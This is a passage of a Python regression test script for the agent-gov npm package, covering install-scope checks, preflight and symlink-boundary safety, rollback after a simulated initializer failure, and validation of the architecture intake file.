#!/usr/bin/env python3
"""Package-level regression checks for agent-gov."""

from __future__ import annotations

import json
import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
import traceback
from datetime import datetime, timezone
from pathlib import Path


PACKAGE_ROOT = Path(__file__).resolve().parents[2]
INIT_SCRIPT = PACKAGE_ROOT / ".codex" / "skills" / "agent-gov" / "scripts" / "init_agent_project.py"
NPM_BIN = PACKAGE_ROOT / "npm" / "bin" / "agent-gov.mjs"


def run(cmd: list[str], cwd: Path, expect_ok: bool = True, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    result = subprocess.run(cmd, cwd=cwd, text=True, capture_output=True, check=False, env=env)
    if expect_ok and result.returncode != 0:
        print("command failed:", " ".join(cmd), file=sys.stderr)
        print("cwd:", cwd, file=sys.stderr)
        caller = traceback.extract_stack(limit=2)[0]
        print(f"caller: {caller.filename}:{caller.lineno}", file=sys.stderr)
        print(result.stdout, file=sys.stderr)
        print(result.stderr, file=sys.stderr)
        if len(cmd) >= 2 and cmd[1] == "scripts/agent_check.py":
            scan = subprocess.run(
                [cmd[0], ".agent/tools/agent_context.py", "scan", "--limit", "12"],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
                env=env,
            )
            print(scan.stdout, file=sys.stderr)
            print(scan.stderr, file=sys.stderr)
            spec_list = subprocess.run(
                [cmd[0], "scripts/agent_spec.py", "list", "--json"],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
                env=env,
            )
            print(spec_list.stdout, file=sys.stderr)
            print(spec_list.stderr, file=sys.stderr)
        raise SystemExit(result.returncode)
    if not expect_ok and result.returncode == 0:
        print("command unexpectedly passed:", " ".join(cmd), file=sys.stderr)
        print("cwd:", cwd, file=sys.stderr)
        caller = traceback.extract_stack(limit=2)[0]
        print(f"caller: {caller.filename}:{caller.lineno}", file=sys.stderr)
        print(result.stdout, file=sys.stderr)
        print(result.stderr, file=sys.stderr)
        raise SystemExit(1)
    return result


def assert_no_missing_doc_refs(target: Path) -> None:
    token_candidates = {
        ".agent/workflow.json": [target / ".agent" / "workflow.json"],
        ".agent/workflow-profiles.json": [target / ".agent" / "workflow-profiles.json"],
        ".agent/task-board.json": [target / ".agent" / "task-board.json"],
        ".agent/risk-zones.json": [target / ".agent" / "risk-zones.json"],
        ".agent/review-policy.json": [target / ".agent" / "review-policy.json"],
        ".agent/worktrees.json": [target / ".agent" / "worktrees.json"],
        ".agent/subagents.json": [target / ".agent" / "subagents.json"],
        ".agent/hooks.json": [target / ".agent" / "hooks.json"],
        ".agent/knowledge.json": [target / ".agent" / "knowledge.json"],
        ".agent/memory.json": [target / ".agent" / "memory.json"],
        ".agent/context.json": [target / ".agent" / "context.json"],
        ".agent/dev-map.json": [target / ".agent" / "dev-map.json"],
        ".agent/skill-hygiene.json": [target / ".agent" / "skill-hygiene.json"],
        ".agent/skill-optimization.json": [target / ".agent" / "skill-optimization.json"],
        ".agent/capabilities.json": [target / ".agent" / "capabilities.json"],
        ".agent/tooling.json": [target / ".agent" / "tooling.json"],
        ".agent/security.json": [target / ".agent" / "security.json"],
        ".agent/mechanical-checks.json": [target / ".agent" / "mechanical-checks.json"],
        ".agent/baselines.json": [target / ".agent" / "baselines.json"],
        ".agent/harness-evolution.json": [target / ".agent" / "harness-evolution.json"],
        ".agent/mcp-policy.json": [target / ".agent" / "mcp-policy.json"],
        ".agent/governance-gc.json": [target / ".agent" / "governance-gc.json"],
        ".agent/skill-distribution.json": [target / ".agent" / "skill-distribution.json"],
        "docs/DEV_MAP.md": [target / "docs" / "DEV_MAP.md"],
        "docs/AI_CODING_GLOSSARY.md": [target / "docs" / "AI_CODING_GLOSSARY.md"],
        "docs/DOMAIN_GLOSSARY.md": [target / "docs" / "DOMAIN_GLOSSARY.md"],
        "docs/SKILL_OPTIMIZATION.md": [target / "docs" / "SKILL_OPTIMIZATION.md"],
        "agent_memory.py": [target / ".agent" / "tools" / "agent_memory.py"],
        "agent_context.py": [target / ".agent" / "tools" / "agent_context.py"],
        "agent_capabilities.py": [target / "scripts" / "agent_capabilities.py"],
        "agent_skill_hygiene.py": [target / "scripts" / "agent_skill_hygiene.py"],
        "agent_skill_opt.py": [target / "scripts" / "agent_skill_opt.py"],
        "agent_tooling.py": [target / "scripts" / "agent_tooling.py"],
        "agent_security.py": [target / "scripts" / "agent_security.py"],
        "agent_task.py": [target / "scripts" / "agent_task.py"],
        "agent_verify.py": [target / "scripts" / "agent_verify.py"],
        "agent_gc.py": [target / "scripts" / "agent_gc.py"],
        "agent_sync_skills.py": [target / "scripts" / "agent_sync_skills.py"],
    }
    docs = [target / "AGENTS.md", target / "docs" / "index.md", target / "docs" / "QUALITY.md"]
    for doc in docs:
        if not doc.exists():
            continue
        text = doc.read_text(encoding="utf-8")
        for token, candidates in token_candidates.items():
            if token in text and not any(candidate.exists() for candidate in candidates):
                print(f"{doc.relative_to(target)} references missing profile path: {token}", file=sys.stderr)
                raise SystemExit(1)


def assert_packed_artifact(temp_root: Path, python: str) -> None:
    pack_dir = temp_root / "packed-artifact"
    pack_dir.mkdir(parents=True, exist_ok=True)
    packed = run(["npm", "pack", "--silent", "--pack-destination", str(pack_dir)], cwd=PACKAGE_ROOT)
    tarball_name = packed.stdout.strip().splitlines()[-1]
    tarball = pack_dir / tarball_name
    if not tarball.is_file():
        print("npm pack did not create the reported tarball", file=sys.stderr)
        print(packed.stdout + packed.stderr, file=sys.stderr)
        raise SystemExit(1)

    install_root = temp_root / "packed-install"
    install_root.mkdir(parents=True, exist_ok=True)
    run(
        [
            "npm",
            "install",
            "--ignore-scripts",
            "--no-audit",
            "--no-fund",
            "--prefix",
            str(install_root),
            str(tarball),
        ],
        cwd=PACKAGE_ROOT,
    )
    installed_package = install_root / "node_modules" / "@airpot" / "agent-gov"
    installed_bin = installed_package / "npm" / "bin" / "agent-gov.mjs"
    if not installed_bin.is_file():
        print("packed npm install is missing the agent-gov executable", file=sys.stderr)
        raise SystemExit(1)
    expected_version = json.loads((installed_package / "package.json").read_text(encoding="utf-8"))["version"]
    actual_version = run(["node", str(installed_bin), "--version"], cwd=install_root).stdout.strip()
    if actual_version != expected_version:
        print(f"packed CLI version mismatch: expected {expected_version}, got {actual_version}", file=sys.stderr)
        raise SystemExit(1)
    readme = (installed_package / "README.md").read_text(encoding="utf-8")
    if f"`{expected_version}`" not in readme or "npm view @airpot/agent-gov version" not in readme:
        print("packed README does not identify the candidate version and registry verification command", file=sys.stderr)
        raise SystemExit(1)

    help_target = temp_root / "packed-help-target"
    run(["node", str(installed_bin), "init", str(help_target), "--help"], cwd=install_root)
    if help_target.exists():
        print("packed init --help created a target", file=sys.stderr)
        raise SystemExit(1)

    target = temp_root / "packed-init-target"
    target.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(installed_bin),
            "init",
            str(target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=install_root,
    )
    run(["node", str(installed_bin), "doctor", str(target)], cwd=install_root)
    registry = json.loads((target / ".agent" / "project-skills.json").read_text(encoding="utf-8"))
    if registry.get("skills", {}).get("agent-gov", {}).get("source", {}).get("ref") != expected_version:
        print("packed init did not register its package version", file=sys.stderr)
        print(json.dumps(registry, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target)


def assert_install_skill_scope(temp_root: Path) -> None:
    project = temp_root / "install-scope-project"
    project.mkdir(parents=True, exist_ok=True)
    codex_home = temp_root / "codex-home"
    env = dict(os.environ)
    env["CODEX_HOME"] = str(codex_home)

    project_install = run(["node", str(NPM_BIN), "install-skill", str(project)], cwd=PACKAGE_ROOT, env=env)
    if "skill scope: project" not in project_install.stdout:
        print("install-skill did not report project scope by default", file=sys.stderr)
        print(project_install.stdout + project_install.stderr, file=sys.stderr)
        raise SystemExit(1)
    if not (project / ".codex" / "skills" / "agent-gov" / "SKILL.md").exists():
        print("default install-skill did not install into project .codex/skills", file=sys.stderr)
        raise SystemExit(1)
    if (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
        print("default install-skill unexpectedly wrote to global CODEX_HOME", file=sys.stderr)
        raise SystemExit(1)

    global_install = run(["node", str(NPM_BIN), "install-skill", "--global", "--force"], cwd=PACKAGE_ROOT, env=env)
    if "skill scope: global" not in global_install.stdout:
        print("install-skill --global did not report global scope", file=sys.stderr)
        print(global_install.stdout + global_install.stderr, file=sys.stderr)
        raise SystemExit(1)
    if not (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
        print("install-skill --global did not install into CODEX_HOME/skills", file=sys.stderr)
        raise SystemExit(1)


def assert_doctor_requires_target_skill(temp_root: Path) -> None:
    project = temp_root / "doctor-target-skill"
    project.mkdir(parents=True, exist_ok=True)

    missing = run(["node", str(NPM_BIN), "doctor", str(project)], cwd=PACKAGE_ROOT, expect_ok=False)
    missing_output = missing.stdout + missing.stderr
    if "missing - target agent-gov skill" not in missing_output:
        print("doctor did not report the missing target agent-gov skill", file=sys.stderr)
        print(missing_output, file=sys.stderr)
        raise SystemExit(1)

    run(["node", str(NPM_BIN), "install-skill", str(project)], cwd=PACKAGE_ROOT)
    installed = run(["node", str(NPM_BIN), "doctor", str(project)], cwd=PACKAGE_ROOT)
    installed_output = installed.stdout + installed.stderr
    if "ok - target agent-gov skill" not in installed_output:
        print("doctor did not report the installed target agent-gov skill", file=sys.stderr)
        print(installed_output, file=sys.stderr)
        raise SystemExit(1)


def assert_npm_install_safety_and_preflight(temp_root: Path, python: str) -> None:
    help_target = temp_root / "init-help-no-side-effects"
    run(["node", str(NPM_BIN), "init", str(help_target), "--help"], cwd=PACKAGE_ROOT)
    if help_target.exists():
        print("init --help created or modified its target", file=sys.stderr)
        raise SystemExit(1)

    invalid_args_target = temp_root / "invalid-init-args"
    invalid_args_target.mkdir(parents=True, exist_ok=True)
    run(
        ["node", str(NPM_BIN), "init", str(invalid_args_target), "--not-a-real-initializer-option"],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if (invalid_args_target / ".codex").exists() or (invalid_args_target / ".agent").exists():
        print("invalid initializer arguments modified the target before preflight failed", file=sys.stderr)
        raise SystemExit(1)

    skip_target = temp_root / "skip-skill-install"
    skip_target.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(skip_target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--skip-skill-install",
        ],
        cwd=PACKAGE_ROOT,
    )
    skip_registry = json.loads((skip_target / ".agent" / "project-skills.json").read_text(encoding="utf-8"))
    if "agent-gov" in skip_registry.get("skills", {}) or (skip_target / ".codex" / "skills" / "agent-gov").exists():
        print("--skip-skill-install installed or registered the bundled skill", file=sys.stderr)
        print(json.dumps(skip_registry, indent=2), file=sys.stderr)
        raise SystemExit(1)

    invalid_python_target = temp_root / "invalid-python-override"
    invalid_python_target.mkdir(parents=True, exist_ok=True)
    invalid_env = dict(os.environ)
    invalid_env["AGENT_GOV_PYTHON"] = "/bin/true" if not sys.platform.startswith("win") else "cmd"
    invalid_python = run(
        ["node", str(NPM_BIN), "init", str(invalid_python_target), "--layout", "minimal"],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
        env=invalid_env,
    )
    if "Python 3" not in (invalid_python.stdout + invalid_python.stderr):
        print("invalid AGENT_GOV_PYTHON did not produce an actionable Python 3 error", file=sys.stderr)
        print(invalid_python.stdout + invalid_python.stderr, file=sys.stderr)
        raise SystemExit(1)
    if (invalid_python_target / ".codex" / "skills" / "agent-gov").exists():
        print("invalid Python preflight left an installed skill behind", file=sys.stderr)
        raise SystemExit(1)

    if not sys.platform.startswith("win"):
        external = temp_root / "symlink-external"
        external.mkdir(parents=True, exist_ok=True)
        symlink_target = temp_root / "symlink-target"
        skill_parent = symlink_target / ".codex" / "skills"
        skill_parent.mkdir(parents=True, exist_ok=True)
        (skill_parent / "agent-gov").symlink_to(external, target_is_directory=True)
        escaped = run(
            ["node", str(NPM_BIN), "install-skill", str(symlink_target)],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
        )
        if "symlink" not in (escaped.stdout + escaped.stderr).lower():
            print("symlink destination rejection did not explain the boundary failure", file=sys.stderr)
            print(escaped.stdout + escaped.stderr, file=sys.stderr)
            raise SystemExit(1)
        if any(external.iterdir()):
            print("project skill install wrote through a symlink outside the target", file=sys.stderr)
            raise SystemExit(1)

    conflict_target = temp_root / "existing-skill-conflict"
    conflict_skill = conflict_target / ".codex" / "skills" / "agent-gov"
    conflict_skill.mkdir(parents=True, exist_ok=True)
    old_skill = "---\nname: agent-gov\ndescription: Existing reviewed local version.\n---\n\n# Existing\n"
    (conflict_skill / "SKILL.md").write_text(old_skill, encoding="utf-8")
    conflict = run(
        ["node", str(NPM_BIN), "install-skill", str(conflict_target)],
        cwd=PACKAGE_ROOT,
        expect_ok=False,
    )
    if "conflict" not in (conflict.stdout + conflict.stderr).lower():
        print("existing unmanifested skill rejection did not explain the conflict", file=sys.stderr)
        print(conflict.stdout + conflict.stderr, file=sys.stderr)
        raise SystemExit(1)
    if (conflict_skill / "SKILL.md").read_text(encoding="utf-8") != old_skill:
        print("conflicting existing skill was modified without force", file=sys.stderr)
        raise SystemExit(1)
    if len([path for path in conflict_skill.rglob("*") if path.is_file()]) != 1:
        print("conflicting existing skill was partially merged with bundled files", file=sys.stderr)
        raise SystemExit(1)

    identity_target = temp_root / "install-identity"
    identity_target.mkdir(parents=True, exist_ok=True)
    run(["node", str(NPM_BIN), "install-skill", str(identity_target)], cwd=PACKAGE_ROOT)
    installed_skill = identity_target / ".codex" / "skills" / "agent-gov"
    install_manifest = installed_skill / ".agent-gov-install.json"
    if not install_manifest.exists():
        print("fresh skill install did not write an install identity manifest", file=sys.stderr)
        raise SystemExit(1)
    manifest = json.loads(install_manifest.read_text(encoding="utf-8"))
    package_version = json.loads((PACKAGE_ROOT / "package.json").read_text(encoding="utf-8"))["version"]
    if manifest.get("schema") != "agent-gov-install-v1" or manifest.get("package_version") != package_version:
        print("skill install identity manifest has wrong schema or package version", file=sys.stderr)
        print(json.dumps(manifest, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run(["node", str(NPM_BIN), "doctor", str(identity_target)], cwd=PACKAGE_ROOT)
    with (installed_skill / "SKILL.md").open("a", encoding="utf-8") as handle:
        handle.write("\nlocal drift\n")
    drifted = run(["node", str(NPM_BIN), "doctor", str(identity_target)], cwd=PACKAGE_ROOT, expect_ok=False)
    if "identity" not in (drifted.stdout + drifted.stderr).lower() and "digest" not in (drifted.stdout + drifted.stderr).lower():
        print("doctor did not identify installed skill content drift", file=sys.stderr)
        print(drifted.stdout + drifted.stderr, file=sys.stderr)
        raise SystemExit(1)

    if not sys.platform.startswith("win"):
        rollback_target = temp_root / "initializer-failure-rollback"
        rollback_target.mkdir(parents=True, exist_ok=True)
        counter_path = temp_root / "python-wrapper-count"
        python_wrapper = temp_root / "python-wrapper.sh"
        python_wrapper.write_text(
            "#!/bin/sh\n"
            f"counter='{counter_path}'\n"
            "count=0\n"
            "if [ -f \"$counter\" ]; then count=$(cat \"$counter\"); fi\n"
            "count=$((count + 1))\n"
            "printf '%s' \"$count\" > \"$counter\"\n"
            "if [ \"$count\" -ge 3 ]; then exit 42; fi\n"
            f"exec '{python}' \"$@\"\n",
            encoding="utf-8",
        )
        python_wrapper.chmod(0o755)
        rollback_env = dict(os.environ)
        rollback_env["AGENT_GOV_PYTHON"] = str(python_wrapper)
        run(
            ["node", str(NPM_BIN), "init", str(rollback_target), "--layout", "minimal"],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
            env=rollback_env,
        )
        if (rollback_target / ".codex" / "skills" / "agent-gov").exists():
            print("failed initializer did not roll back the skill installed by that invocation", file=sys.stderr)
            raise SystemExit(1)

        replacement_target = temp_root / "initializer-failure-restores-existing"
        replacement_skill = replacement_target / ".codex" / "skills" / "agent-gov"
        replacement_skill.mkdir(parents=True, exist_ok=True)
        original_skill = "---\nname: agent-gov\ndescription: Preserve this existing skill.\n---\n\n# Preserve\n"
        (replacement_skill / "SKILL.md").write_text(original_skill, encoding="utf-8")
        replacement_counter = temp_root / "replacement-python-wrapper-count"
        replacement_wrapper = temp_root / "replacement-python-wrapper.sh"
        replacement_wrapper.write_text(
            "#!/bin/sh\n"
            f"counter='{replacement_counter}'\n"
            "count=0\n"
            "if [ -f \"$counter\" ]; then count=$(cat \"$counter\"); fi\n"
            "count=$((count + 1))\n"
            "printf '%s' \"$count\" > \"$counter\"\n"
            "if [ \"$count\" -ge 3 ]; then exit 42; fi\n"
            f"exec '{python}' \"$@\"\n",
            encoding="utf-8",
        )
        replacement_wrapper.chmod(0o755)
        replacement_env = dict(os.environ)
        replacement_env["AGENT_GOV_PYTHON"] = str(replacement_wrapper)
        run(
            [
                "node",
                str(NPM_BIN),
                "init",
                str(replacement_target),
                "--layout",
                "minimal",
                "--force-skill",
            ],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
            env=replacement_env,
        )
        replacement_files = [path for path in replacement_skill.rglob("*") if path.is_file()]
        if replacement_files != [replacement_skill / "SKILL.md"] or replacement_files[0].read_text(encoding="utf-8") != original_skill:
            print("failed initializer did not restore the existing skill after forced replacement", file=sys.stderr)
            raise SystemExit(1)


def assert_fresh_npm_skill_registry(temp_root: Path, python: str) -> None:
    target = temp_root / "fresh-npm-skill-registry"
    target.mkdir(parents=True, exist_ok=True)
    intake = temp_root / "fresh-npm-skill-registry-intake.json"
    write_intake(
        intake,
        {
            "project_target": "library",
            "selection_status": "confirmed",
            "language_preference": ["python"],
        },
    )
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(target),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--architecture-intake",
            str(intake),
        ],
        cwd=PACKAGE_ROOT,
    )
    registry_path = target / ".agent" / "project-skills.json"
    registry = json.loads(registry_path.read_text(encoding="utf-8"))
    installed = registry.get("skills", {}).get("agent-gov", {})
    if installed.get("path") != ".codex/skills/agent-gov" or installed.get("source", {}).get("kind") != "npm":
        print("fresh npm init did not register bundled agent-gov as a managed project skill", file=sys.stderr)
        print(json.dumps(registry, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if not installed.get("source", {}).get("ref") or not installed.get("content", {}).get("tree_sha256"):
        print("fresh npm skill registry is missing package version or content identity", file=sys.stderr)
        print(json.dumps(installed, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target)

    add_version_decisions(target)
    mark_blueprint_reviewed(target)
    saved_skills = registry["skills"]
    registry["skills"] = {}
    registry_path.write_text(json.dumps(registry, indent=2) + "\n", encoding="utf-8")
    strict = run([python, "scripts/agent_check.py", "--strict"], cwd=target, expect_ok=False)
    if "project skills readiness failed" not in (strict.stdout + strict.stderr):
        print("strict readiness did not surface orphaned project skill failure", file=sys.stderr)
        print(strict.stdout + strict.stderr, file=sys.stderr)
        raise SystemExit(1)
    score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False)
    score_report = json.loads(score.stdout)
    if score_report.get("status") != "fail" or "project_skills" not in score_report.get("hard_fail_dimensions", []):
        print("governance score did not hard-fail orphaned project skill state", file=sys.stderr)
        print(json.dumps(score_report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    registry["skills"] = saved_skills
    registry_path.write_text(json.dumps(registry, indent=2) + "\n", encoding="utf-8")

    existing = temp_root / "existing-governed-skill-registry"
    existing.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(existing),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    existing_registry_path = existing / ".agent" / "project-skills.json"
    existing_registry = json.loads(existing_registry_path.read_text(encoding="utf-8"))
    existing_registry["skills"]["agent-gov"] = {
        "scope": "project",
        "host": "codex",
        "path": ".codex/skills/agent-gov",
        "lifecycle": "active",
        "intent": "workspace-only",
        "owner": "existing-owner",
        "risk": "high",
        "source": {"kind": "repo-local", "repository": "", "ref": "old", "pinned": False},
        "content": {"skill_md_sha256": "old", "tree_sha256": "old"},
        "release": {"manifest": "existing-manifest.json", "publishable": False, "release_gate": "existing-gate"},
        "review": {"requires_review": True, "latest_status": "pass", "latest_artifact": "docs/existing-review.md"},
        "custom_policy": "preserve-me",
    }
    existing_registry_path.write_text(json.dumps(existing_registry, indent=2) + "\n", encoding="utf-8")
    before_dry_run = existing_registry_path.read_bytes()
    run(["node", str(NPM_BIN), "install-skill", str(existing), "--dry-run"], cwd=PACKAGE_ROOT)
    if existing_registry_path.read_bytes() != before_dry_run:
        print("install-skill --dry-run modified project-skills.json", file=sys.stderr)
        raise SystemExit(1)

    run(["node", str(NPM_BIN), "install-skill", str(existing)], cwd=PACKAGE_ROOT)
    existing_registry = json.loads(existing_registry_path.read_text(encoding="utf-8"))
    existing_entry = existing_registry.get("skills", {}).get("agent-gov", {})
    if existing_entry.get("source", {}).get("kind") != "npm" or not existing_entry.get("content", {}).get("tree_sha256"):
        print("install-skill did not register bundled agent-gov in an existing governed project", file=sys.stderr)
        print(json.dumps(existing_registry, indent=2), file=sys.stderr)
        raise SystemExit(1)
    for key, expected in (
        ("owner", "existing-owner"),
        ("intent", "workspace-only"),
        ("risk", "high"),
        ("custom_policy", "preserve-me"),
    ):
        if existing_entry.get(key) != expected:
            print(f"install-skill replaced project-owned registry metadata: {key}", file=sys.stderr)
            print(json.dumps(existing_entry, indent=2), file=sys.stderr)
            raise SystemExit(1)
    if existing_entry.get("release", {}).get("release_gate") != "existing-gate":
        print("install-skill replaced project-owned release governance metadata", file=sys.stderr)
        raise SystemExit(1)
    if existing_entry.get("review", {}).get("latest_status") != "pending" or existing_entry.get("review", {}).get("latest_artifact"):
        print("install-skill did not invalidate required review evidence after lifecycle change", file=sys.stderr)
        print(json.dumps(existing_entry.get("review", {}), indent=2), file=sys.stderr)
        raise SystemExit(1)
    existing_entry["review"] = {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""}
    existing_registry_path.write_text(json.dumps(existing_registry, indent=2) + "\n", encoding="utf-8")
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=existing)


def assert_blank_project_default_profile(temp_root: Path) -> None:
    blank = temp_root / "blank-default-full"
    blank.mkdir(parents=True, exist_ok=True)
    run(["node", str(NPM_BIN), "init", str(blank), "--layout", "minimal", "--remote-kind", "local"], cwd=PACKAGE_ROOT)
    blank_config = json.loads((blank / ".agent" / "config.json").read_text(encoding="utf-8"))
    if blank_config.get("governance_profile") != "full":
        print("blank project did not default to full governance profile", file=sys.stderr)
        print(json.dumps(blank_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    for relative in (".agent/subagents.json", ".agent/hooks.json", ".agent/tooling.json", ".codex/config.toml", "scripts/agent_tooling.py"):
        if not (blank / relative).exists():
            print(f"blank project full default did not create full-profile artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)

    existing = temp_root / "existing-default-standard"
    existing.mkdir(parents=True, exist_ok=True)
    (existing / "README.md").write_text("# Existing Project\n", encoding="utf-8")
    run(["node", str(NPM_BIN), "init", str(existing), "--layout", "minimal", "--remote-kind", "local"], cwd=PACKAGE_ROOT)
    existing_config = json.loads((existing / ".agent" / "config.json").read_text(encoding="utf-8"))
    if existing_config.get("governance_profile") != "standard":
        print("existing project did not default to standard governance profile", file=sys.stderr)
        print(json.dumps(existing_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if (existing / ".agent" / "subagents.json").exists():
        print("existing project standard default unexpectedly created full-profile subagent config", file=sys.stderr)
        raise SystemExit(1)

    explicit = temp_root / "blank-explicit-standard"
    explicit.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(explicit),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    explicit_config = json.loads((explicit / ".agent" / "config.json").read_text(encoding="utf-8"))
    if explicit_config.get("governance_profile") != "standard":
        print("explicit standard profile was not respected for a blank project", file=sys.stderr)
        print(json.dumps(explicit_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if (explicit / ".agent" / "subagents.json").exists():
        print("explicit standard profile unexpectedly created full-profile subagent config", file=sys.stderr)
        raise SystemExit(1)
    for relative in (".agent/security.json", "scripts/agent_security.py"):
        if not (explicit / relative).exists():
            print(f"explicit standard profile did not create its security command registry: {relative}", file=sys.stderr)
            raise SystemExit(1)
    for relative in (".agent/tooling.json", "scripts/agent_tooling.py", "docs/SECURITY.md"):
        if (explicit / relative).exists():
            print(f"explicit standard profile unexpectedly created full-profile artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)


def write_intake(path: Path, data: dict) -> None:
    payload = {"schema": "agent-architecture-intake-v1", **data}
    path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")


def assert_strict_architecture_intake(temp_root: Path, python: str) -> None:
    invalid_values = ({"unexpected": True}, [True], 1, None, "not-a-boolean")
    for index, value in enumerate(invalid_values):
        intake_path = temp_root / f"invalid-boolean-intake-{index}.json"
        write_intake(intake_path, {"skills_are_first_class": value})
        target = temp_root / f"invalid-boolean-target-{index}"
        target.mkdir(parents=True, exist_ok=True)
        result = run(
            [
                python,
                str(INIT_SCRIPT),
                str(target),
                "--layout",
                "minimal",
                "--governance-profile",
                "standard",
                "--architecture-intake",
                str(intake_path),
                "--no-makefile",
            ],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
        )
        output = result.stdout + result.stderr
        if "architecture intake field skills_are_first_class" not in output:
            print(f"malformed architecture boolean did not produce a field-specific error: {value!r}", file=sys.stderr)
            print(output, file=sys.stderr)
            raise SystemExit(1)
        for relative in (".agent", ".codex", "AGENTS.md", "scripts"):
            if (target / relative).exists():
                print(f"malformed architecture intake left a partial target write: {relative}", file=sys.stderr)
                raise SystemExit(1)

    short_circuit_cases = (
        (
            "frontend-enabled-with-framework",
            {"frontend": {"enabled": {"invalid": True}, "framework": "react"}},
            "architecture intake field frontend.enabled",
        ),
        (
            "frontend-confirmed-with-selection",
            {"frontend": {"confirmed": [], "selection_status": "confirmed"}},
            "architecture intake field frontend.confirmed",
        ),
        (
            "visualization-confirmed-with-engine",
            {"frontend": {"visualization_enabled": True, "visualization_engine": "echarts", "visualization_confirmed": 1}},
            "architecture intake field frontend.visualization_confirmed",
        ),
        (
            "mcp-enabled-with-target",
            {"project_target": "mcp-server", "mcp_server_enabled": {"invalid": True}},
            "architecture intake field mcp_server_enabled",
        ),
        (
            "nested-vitals-enabled",
            {"frontend": {"enabled": True, "core_web_vitals": {"enabled": "sometimes"}}},
            "architecture intake field frontend.core_web_vitals.enabled",
        ),
    )
    for case_id, payload, expected in short_circuit_cases:
        intake_path = temp_root / f"strict-intake-{case_id}.json"
        write_intake(intake_path, payload)
        target = temp_root / f"strict-intake-target-{case_id}"
        target.mkdir(parents=True, exist_ok=True)
        result = run(
            [
                python,
                str(INIT_SCRIPT),
                str(target),
                "--layout",
                "minimal",
                "--governance-profile",
                "standard",
                "--architecture-intake",
                str(intake_path),
                "--no-makefile",
            ],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
        )
        output = result.stdout + result.stderr
        if expected not in output:
            print(f"short-circuit architecture intake case did not fail on {expected}: {case_id}", file=sys.stderr)
            print(output, file=sys.stderr)
            raise SystemExit(1)
        for relative in (".agent", ".codex", "AGENTS.md", "scripts"):
            if (target / relative).exists():
                print(f"short-circuit architecture intake left a partial target write: {case_id}: {relative}", file=sys.stderr)
                raise SystemExit(1)


def add_version_decisions(target: Path) -> None:
    blueprint_path = target / ".agent" / "blueprint.json"
    blueprint = json.loads(blueprint_path.read_text(encoding="utf-8"))
    runtime = blueprint.get("runtime_framework_decision", {})
    version_decisions = blueprint.setdefault("technology_version_decisions", {})
    version_decisions.update(
        {
            "status": "review-ready",
            "source": "npm-regression",
            "version_policy": "Regression fixture records LTS lines or application lockfile policy before implementation.",
            "languages_and_runtimes": [
                {
                    "name": "python",
                    "version": "3.12",
                    "constraint": ">=3.12,<3.13",
                    "source": "npm regression fixture",
                    "owner": "regression",
                    "status": "decided",
                }
            ],
            "package_managers": [
                {
                    "name": "pip",
                    "version": "",
                    "constraint": "defer-to-application-lockfile",
                    "source": "npm regression fixture",
                    "owner": "regression",
                    "status": "deferred-to-application-lockfile",
                }
            ],
            "frameworks_and_libraries": [
                {
                    "name": "strands-agents",
                    "version": "",
                    "constraint": "defer-to-application-lockfile",
                    "source": "npm regression fixture",
                    "owner": "regression",
                    "status": "deferred-to-application-lockfile",
                }
            ],
            "datastores_and_services": [],
            "deployment_targets": [],
            "agent_runtime_and_mcp": [
                {
                    "name": str(runtime.get("primary_adapter", "strands") or "strands"),
                    "version": "",
                    "constraint": "defer-to-application-lockfile",
                    "source": "npm regression fixture",
                    "owner": "regression",
                    "status": "deferred-to-application-lockfile",
                }
            ],
            "lockfile_or_environment_evidence": [
                {
                    "name": "fixture",
                    "version": "",
                    "constraint": "application-owned lockfile policy",
                    "source": "npm regression fixture",
                    "owner": "regression",
                    "status": "decided",
                }
            ],
            "open_version_decisions": [],
        }
    )
    for plan in runtime.get("package_plan", []):
        if isinstance(plan, dict):
            plan["version_status"] = "deferred-to-application-lockfile"
            plan["version_policy"] = "defer-to-lockfile"
            constraints = plan.setdefault("package_version_constraints", {})
            for package in plan.get("packages", []):
                constraints[package] = "defer-to-application-lockfile"
    blueprint_path.write_text(json.dumps(blueprint, indent=2) + "\n", encoding="utf-8")


def mark_blueprint_reviewed(target: Path, *, with_versions: bool = True) -> None:
    if with_versions:
        add_version_decisions(target)
    blueprint_path = target / ".agent" / "blueprint.json"
